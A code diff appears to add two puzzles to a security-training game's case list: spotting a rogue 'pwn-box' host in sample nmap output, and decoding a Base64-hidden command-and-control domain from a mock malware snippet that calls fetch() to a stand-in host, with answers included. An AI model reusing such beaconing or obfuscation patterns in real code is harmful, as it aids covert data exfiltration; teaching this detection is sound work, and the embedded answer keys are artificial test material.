@@ -252,5 +252,57 @@ export const cases: Case[] = [
         aiPuzzleDescription: "The user is viewing a text snippet on a webpage that represents leaked data. They need to find and copy the value of the 'FLAG' contained within the text."
       }
     ]
+  },
+  {
+    id: "case-07",
+    title: "Case 07: The Wi-Fi Intrusion",
+    description: "Unusual activity has been detected on the corporate Wi-Fi. Identify the unauthorized device.",
+    puzzles: [
+      {
+        id: "c07p01",
+        type: "terminal",
+        title: "Scan the Network",
+        description: "A network scan reveals all connected devices. Find the one that doesn't belong.",
+        content: `
+          $ nmap -sP 192.168.1.0/24
+          ...
+          Nmap scan report for 192.168.1.101 (Server-01)
+          Nmap scan report for 192.168.1.102 (Workstation-34)
+          Nmap scan report for 192.168.1.103 (pwn-box)
+          Nmap scan report for 192.168.1.104 (Printer-Office)
+          ...
+        `,
+        prompt: "One of these devices has a suspicious hostname. What is it?",
+        solution: "pwn-box",
+        points: 150,
+        aiPuzzleDescription: "The user is looking at a list of devices on a network from an nmap scan. They need to identify the device with a name that implies malicious intent."
+      }
+    ]
+  },
+  {
+    id: "case-08",
+    title: "Case 08: The Malware Outbreak",
+    description: "A piece of malware is spreading. Analyze its code to find the command and control server.",
+    puzzles: [
+      {
+        id: "c08p01",
+        type: "website",
+        title: "Analyze Malware Code",
+        description: "You've obtained a snippet of the malware's source code.",
+        content: `
+          <div class="font-mono text-sm whitespace-pre-wrap bg-black text-green-400 p-4 rounded">
+            <span class="text-blue-400">function</span> <span class="text-yellow-300">contactC2</span>() {
+              <span class="text-gray-400">// Config</span>
+              <span class="text-purple-400">let</span> server = <span class="text-red-400">atob</span>(<span class="text-orange-400">"ZXZpbC1jMmQuaW5mby8="</span>);
+              <span class="text-purple-400">fetch</span>(server + <span class="text-orange-400">"/checkin"</span>);
+            }
+          </div>
+        `,
+        prompt: "The malware contacts a Command & Control (C2) server. The address is Base64 encoded. What is the decoded C2 domain?",
+        solution: "evil-c2.info/",
+        points: 200,
+        aiPuzzleDescription: "The user is looking at a snippet of code. They need to find a Base64 encoded string, decode it, to find the malware's command and control server domain."
+      }
+    ]
   }
 ];
